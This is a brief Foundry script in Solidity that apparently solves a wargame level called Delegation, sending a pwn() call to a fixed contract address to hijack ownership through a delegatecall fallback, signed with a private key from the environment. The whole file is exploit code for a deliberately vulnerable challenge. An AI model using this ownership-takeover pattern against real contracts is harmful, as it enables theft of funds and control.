// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Delegation.sol";

contract DelegationScript is Script {
    
        function run() external {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            Delegation instance = Delegation(0xe52699BA5A48c82557730171387e0b49Fd81eE36);
            address(instance).call(abi.encodeWithSignature("pwn()"));
            vm.stopBroadcast();
        }
}